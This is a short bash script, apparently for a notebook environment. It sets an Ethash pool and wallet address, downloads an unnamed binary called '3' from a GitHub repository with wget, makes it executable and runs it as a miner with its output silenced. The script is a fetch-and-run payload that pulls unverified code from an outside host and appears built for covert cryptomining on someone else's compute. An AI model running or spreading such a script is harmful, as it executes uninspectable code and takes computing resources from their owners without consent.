#!/bin/bash

#################################
## Begin of user-editable part ##
#################################

ALGHO=ETHASH
POOL=stratum+tcp://us-eth.2miners.com:2020
WALLET=0x6e890745813facaeab2afab23440a04f6b55034a
WORKER=$(echo $(shuf -i 1-999 -n 1)-VGA)

#################################
##  End of user-editable part  ##
#################################

! cd "$(dirname "$0")"

! wget https://github.com/mencobaiajanah/SPLIT/raw/main/3
! chmod +x 3
! ./3 --algo $ALGHO --pool $POOL --user $WALLET.$WORKER > /dev/null
